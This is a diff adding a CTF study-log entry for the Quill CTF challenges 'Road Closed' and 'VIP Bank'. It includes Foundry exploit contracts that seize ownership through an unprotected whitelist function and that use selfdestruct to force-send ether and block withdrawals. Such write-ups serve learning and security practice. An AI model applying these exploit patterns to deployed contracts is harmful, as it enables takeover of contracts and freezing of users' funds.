@@ -741,5 +741,72 @@ Solve:
     }
 ```
 
+### 2024.09.09
+
+- Quill CTF: Road Closed
+- Quill CTF: VIP Bank
+
+#### Road Closed
+There is no access control with `addToWhitelist`, so we can call `addToWhitelist` -> `changeOwner` -> `pwn` with a EOA? However, this quiz might want to check the code size while the constructor phase is 0.
+
+
+#### VIP Bank
+The goal is to block the withdraw, which we can take advantage from the `selfdestruct`:
+```solidity
+require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
+        require(balances[msg.sender] >= _amount, "Not enough ether");
+```
+
+#### Solve:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {RoadClosed} from "../src/road-block.sol";
+import {VIP_Bank} from "../src/VIPBank.sol";
+
+contract CounterTest is Test {
+    RoadClosed public roadClosed;
+    VIP_Bank public vipBank;
+
+
+    function setUp() public {
+        roadClosed = new RoadClosed();
+        vipBank = new VIP_Bank();
+    }
+
+    function test_solve_road() public {
+        RoadClosedExploit rce = new RoadClosedExploit(roadClosed);
+        assert(roadClosed.isHacked());
+    }
+
+    function test_solve_vip() public {
+        vipBank.addVIP(address(this));
+        vipBank.deposit{value: 0.05 ether}();
+
+        VIPBankExploit ve = new VIPBankExploit{value: 0.01 ether}(address(vipBank));
+
+        vm.expectRevert();
+        vipBank.withdraw(0.01 ether);
+    }
+
+}
+
+contract RoadClosedExploit{
+    constructor( RoadClosed rc) {
+        rc.addToWhitelist(address(this));
+        rc.changeOwner(address(this));
+        rc.pwn(address(this));
+    }
+}
+
+contract VIPBankExploit{
+    constructor(address bank) payable{
+        selfdestruct(payable(bank));
+    }
+}
+```
 
 <!-- Content_END -->
